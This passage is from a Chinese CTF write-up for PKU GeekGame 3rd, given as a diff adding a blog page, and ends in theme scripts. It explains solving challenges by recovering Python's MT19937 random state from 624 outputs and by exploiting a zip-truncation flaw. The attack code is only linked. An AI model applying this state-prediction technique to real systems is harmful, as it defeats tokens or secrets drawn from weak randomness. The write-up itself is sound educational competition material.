class="hljs-keyword">loop</span>】喵<br><br><br>f6：<br>如果没看到【👉 】就跳转到【f6_continue】喵<br><br>f6_loop：<br>把【💊(.)】替换成【<span class="hljs-string">\g&lt;1&gt;💊】喵</span><br>如果看到【💊<span class="hljs-string">\]】就跳转到【f6_judge_zero】喵</span> <br>如果看到【💊<span class="hljs-string">\[】就跳转到【f6_add】喵</span> <br>如果看到【^】就跳转到【f6_loop】喵 <br><br>f6_add：<br>把【💉】替换成【💉d】喵<br>如果看到【^】就跳转到【f6_loop】喵 <br><br>f6_judge_zero：<br>如果看到【💉🐘】就跳转到【f6_continue】喵 <br>把【💉d】替换成【💉】喵<br>如果看到【^】就跳转到【f6_loop】喵 <br><br>f6_continue：<br>把【💊(.)】替换成【<span class="hljs-string">\g&lt;1&gt;💊】喵</span><br>如果看到【^】就跳转到【<span class="hljs-keyword">loop</span>】喵<br><br><br>f7：<br>如果没看到【👉a】就跳转到【f7_move_and_continue】喵<br><br>f7_loop：<br>把【(.)💊】替换成【💊<span class="hljs-string">\g&lt;1&gt;】喵</span><br>如果看到【<span class="hljs-string">\]💊】就跳转到【f7_add】喵</span> <br>如果看到【<span class="hljs-string">\[💊】就跳转到【f7_judge_zero】喵</span> <br>如果看到【^】就跳转到【f7_loop】喵 <br><br>f7_add：<br>把【💉】替换成【💉d】喵<br>如果看到【^】就跳转到【f7_loop】喵 <br><br>f7_judge_zero：<br>如果看到【💉🐘】就跳转到【f7_continue】喵 <br>把【💉d】替换成【💉】喵<br>如果看到【^】就跳转到【f7_loop】喵 <br><br>f7_move_and_continue：<br>把【💊(.)】替换成【<span class="hljs-string">\g&lt;1&gt;💊】喵</span><br><br>f7_continue：<br>如果看到【^】就跳转到【<span class="hljs-keyword">loop</span>】喵<br><br><br>f5：<br>把【💀🐘(.*)👉(a&#123;<span class="hljs-number">32</span>&#125;) (.*$)】替换成【 💀🐘<span class="hljs-string">\g&lt;1&gt;👉\g&lt;2&gt;</span> <span class="hljs-string">\g&lt;3&gt;】喵</span><br>把【💀🐘(.*)👉(a&#123;<span class="hljs-number">33</span>&#125;) (.*$)】替换成【!💀🐘<span class="hljs-string">\g&lt;1&gt;👉\g&lt;2&gt;</span> <span class="hljs-string">\g&lt;3&gt;】喵</span><br>【【中间省略喵！】】<br>把【💀🐘(.*)👉(a&#123;<span class="hljs-number">121</span>&#125;) (.*$)】替换成【y💀🐘<span class="hljs-string">\g&lt;1&gt;👉\g&lt;2&gt;</span> <span class="hljs-string">\g&lt;3&gt;】喵</span><br>把【💀🐘(.*)👉(a&#123;<span class="hljs-number">122</span>&#125;) (.*$)】替换成【z💀🐘<span class="hljs-string">\g&lt;1&gt;👉\g&lt;2&gt;</span> <span class="hljs-string">\g&lt;3&gt;】喵</span><br><br>把【💊(.)】替换成【<span class="hljs-string">\g&lt;1&gt;💊】喵</span><br>如果看到【^】就跳转到【<span class="hljs-keyword">loop</span>】喵<br><br><br>end：<br>把【^(.*)💀.*$】替换成【<span class="hljs-string">\g&lt;1&gt;】喵</span><br><br>谢谢喵<br></code></pre></td></tr></table></figure>
+<h2 id="未来磁盘">未来磁盘</h2>
+<h3 id="flag1-8">flag1</h3>
+<p>这道题是第一阶段最后冲分做的，做法比较功利。观察最后一次压缩的文件，可以看出来分段点大约在中间。找了个5T的大硬盘直接解压，解压到一半的时候从中间找字符串直接找到了。</p>
+<p>现在再想，用管道符应该可以不占用硬盘直接解压；或者更简单一点，由于其他部分完全没有信息，直接用<code>zcat</code>输出到终端就行。</p>
+<h2 id="小章鱼的曲奇">小章鱼的曲奇</h2>
+<p><a
+target="_blank" rel="noopener" href="https://github.com/allons42/CTF-Writeup/blob/main/PKUgeekgame-3rd/codes/tako.ipynb">code</a>
+(flag1 &amp; flag2)</p>
+<p><del>好像没搞懂，迷迷糊糊就过了</del></p>
+<h3 id="flag1-9">flag1</h3>
+<p>题目对flag加上了随机生成的噪声，但是flag前面有2500比特的空白。python的随机数生成使用了梅森旋转算法（MT19937），只要有624个连续的32位数字，我们就可以据此推断后续的随机数内容，这里刚好是足够的。找个<a
+target="_blank" rel="noopener" href="https://blog.csdn.net/qq_57235775/article/details/131168939">现成的轮子</a>改一下就能用。</p>
+<h3 id="flag2-8">flag2</h3>
+<p>题目要求构造一个seed2，和seed1分别作为种子生成随机数，加入一定的偏移量后与噪声异或，其余部分和前面一样。或许有合理的算法可以构造seed2，但是任取一个数字再枚举偏移量的计算量也是可接受的。</p>
+<p>……写完枚举的算法发现任意偏移量都可以算出结果，所以事实上多个随机数的异或仍然符合梅森旋转算法的规律？没有仔细推算。</p>
+<h3 id="flag3-1">flag3</h3>
+<p>没看懂这题想干嘛，输出了100个随机种子，再读取100个随机种子，要求每对种子输出的随机数相同，但没有要求种子不同？而且python里zip这种组合方式会取两组列表中较短的长度，所以直接输入第一个种子就拿到了flag。</p>
+<p><img src="/img/geek3/tako.png" srcset="/img/loading.gif" lazyload /></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Tech/" class="category-chain-item">Tech</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Tech/" class="print-no-link">#Tech</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PKU GeekGame 3rd Writeup</div>
+      <div>https://allons42.github.io/geekgame_3rd/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>allons42</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/readings_2023/" title="2023年的一些读书总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2023年的一些读书总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/geekgame_2nd/" title="PKU GeekGame 2nd Writeup">
+                        <span class="hidden-mobile">PKU GeekGame 2nd Writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://allons42.netlify.app/.netlify/functions/twikoo","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
